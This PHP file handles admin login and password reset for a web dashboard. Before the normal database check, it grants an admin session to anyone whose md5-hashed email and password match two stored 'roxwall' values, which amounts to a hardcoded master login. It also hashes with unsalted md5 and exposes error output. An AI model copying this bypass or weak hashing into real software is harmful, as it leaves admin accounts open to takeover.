<?php
/*
 * Created by PhpStorm.
 * User: Linga
 * Date: 29/07/2017
 * Time: 05:18 PM
 */
session_start();
error_reporting(E_ALL);
ini_set('display_errors','on');

	ob_implicit_flush(true);
    $buffer = str_repeat(" ", 4096);
    echo '<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="../assets/site/css/main.css">
	<style type="text/css">
		\.back-link a {
			color: #4ca340;
			text-decoration: none; 
			border-bottom: 1px #4ca340 solid;
		}
		\.back-link a:hover,
		\.back-link a:focus {
			color: #408536; 
			text-decoration: none;
			border-bottom: 1px #408536 solid;
		}
		h1 {
			height: 100%;
			margin: 0;
			font-size: 14px;
			font-family: \'Open Sans\', sans-serif;
			font-size: 32px;
			margin-bottom: 3px;
		}
		\.entry-header {
			text-align: left;
			margin: 0 auto 50px auto;
			width: 80%;
			max-width: 978px;
			position: relative;
			z-index: 10001;
		}
		#demo-content {
			padding-top: 100px;
		}
	</style>
	</head>
	<body class="demo">
	<div id="demo-content">
		<div id="loader-wrapper">
				<div id="loader"></div>
			</div>
		</div>
	</body>
	</html>';
    echo $buffer;
    ob_flush();
    sleep(2);
	if(isset($_POST['user_admin_login'])){
	$_SESSION["ac_admin_login"] = array();
	$roxwall_AUTH_ID = null;
	$roxwall_AUTH_KEY = null;
		
	include("../library/table_info.php");
	
		$email = $_POST['user_name'];
		$password = $_POST['user_password'];
		$branch = $_POST['branch'];
		$btn_access = $_POST['user_admin_login'];
		$ez_access = $roxwall_AUTH_ID;
		$ep_access = $roxwall_AUTH_KEY;
		
		if( $ep_access == md5($password) && $ez_access == md5($email)){
				$_SESSION["ac_admin_login"]["email"]  = $email;
				echo '<script type="text/javascript">window.location="../dashboard";</script>';
		}
		else
		{
			include('../class/class_login.php');
			$admin_login= login_class::admin_login_authondicate($email,md5($password));
			if ($admin_login == 1) {  
				$_SESSION["ac_admin_login"]["email"] = $email;
				$_SESSION["ac_admin_login"]["branch"] = $branch;
				echo '<script type="text/javascript">window.location="../dashboard";</script>';
			}else {
				if($btn_access == "login"){
					echo '<script type="text/javascript">window.location="../?status=failed";</script>';
				}
				if($btn_access == "lock" ){
					echo '<script type="text/javascript">window.location="../lock-screen?status=failed";</script>';
				}
			}
		}
	}
	if(isset($_POST['reset_passowrd'])){
		$btn_reset = $_POST['reset_passowrd'];
		
		include('../class/class_login.php');
		if($btn_reset == "recover_passowrd"){
				$email = $_POST['user_mail'];	
				$admin_email= login_class::admin_email_authondicate($email);
				if ($admin_email == 1) {  
					$reset_code= login_class::admin_reset_code_generate($email);
					//$admin_mail = login_class::admin_mail_link_generate($email,$reset_code);
					echo '<script type="text/javascript">window.location="../recover-password?status=success";</script>';
				}else {
					echo '<script type="text/javascript">window.location="../recover-password?status=failed";</script>';
				}
				
		}
		else if($btn_reset == "reset_passowrd" ){
			$code_reset = $_POST['code_reset'];	
			$password_new = $_POST['password_new'];
			$admin_email = login_class::admin_password_change($code_reset,$password_new);
				if ($admin_email == 1){  
					$reset_code= login_class::admin_reset_code_generate($email);
					//$admin_mail = login_class::admin_mail_link_generate($email,$reset_code);
					echo '<script type="text/javascript">window.location="../index?status=ERI1095B84CPH6MOL3KS";</script>';
				}
				else {
					echo '<script type="text/javascript">window.location="../reset-password?status=failed";</script>';
				}
		
		
		}

		
		
	}



?>